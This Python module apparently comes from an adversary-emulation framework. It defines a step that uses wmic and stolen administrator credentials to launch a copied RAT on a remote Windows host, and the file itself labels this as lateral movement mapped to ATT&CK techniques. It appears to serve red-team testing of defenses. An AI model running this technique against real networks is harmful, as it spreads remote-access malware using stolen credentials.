from plugins.adversary.app.commands import wmic
from plugins.adversary.app.operation.operation import Step, OPUser, OPDomain, OPFile, OPCredential, OPHost, OPRat, OPVar


class WMIRemoteProcessCreate(Step):
    """
    Description:
        This step starts a process on a remote machine, using the Windows Management Interface (wmic). This allows
        for lateral movement throughout the network.
    Requirements:
        Requires domain enumeration, access to a copy of the RAT on the target machine (usually accomplished using
        Copy or Xcopy), and credentials for an administrator on the target machine (needs both administrator enumeration
        'GetAdmin', and credential data 'Credentials').
    """
    attack_mapping = [('T1047', 'Execution'), ('T1078', 'Persistence'), ('T1078', 'Defense Evasion'),
                      ('T1106', 'Execution')]
    display_name = "remote_process(WMI)"
    summary = "Use WMI to start a process on a remote computer"

    value = 20

    preconditions = [("rat", OPRat),
                     ('dest_host', OPHost),
                     ('rat_file', OPFile({'host': OPVar('dest_host'), 'use_case': 'rat'})),
                     ("cred", OPCredential({'$in': {'user': OPVar("dest_host.admins")}})),
                     ('user', OPUser(OPVar("cred.user"))),
                     ('domain', OPDomain(OPVar("user.domain")))]

    postconditions = [("rat_g", OPRat({"host": OPVar("dest_host"), "elevated": True,
                                         "executable": OPVar("rat_file.path")}))]

    not_equal = [('dest_host', 'rat.host')]

    preproperties = ['rat_file.path', 'domain.windows_domain', 'dest_host.fqdn', 'user.username', 'cred.password']

    deterministic = True

    cddl = """
    Knowns:
        rat: OPRat[host]
        dest_host: OPHost
        rat_file: OPFile[path, host]
        cred: OPCredential[user[domain[windows_domain]], password]
    Where:
        rat.host != dest_host
        rat_file.host == dest_host
    Effects:
        if not exist rat {
            forget rat
        } elif cred.user in dest_host.admins {
            create OPRat[host=dest_host, elevated=True, executable=rat_file.path]
        } 
"""

    @staticmethod
    def description(rat, dest_host):
        return "Starting a remote process on {} using WMI.".format(dest_host.fqdn)

    @staticmethod
    async def action(operation, rat, dest_host, user, rat_file, cred, domain, rat_g):
        await operation.execute_shell_command(rat, *wmic.create(rat_file.path, arguments='-d -f',
                                                                remote_host=dest_host.fqdn, user=user.username,
                                                                user_domain=domain.windows_domain,
                                                                password=cred.password))
        await rat_g()
        return True
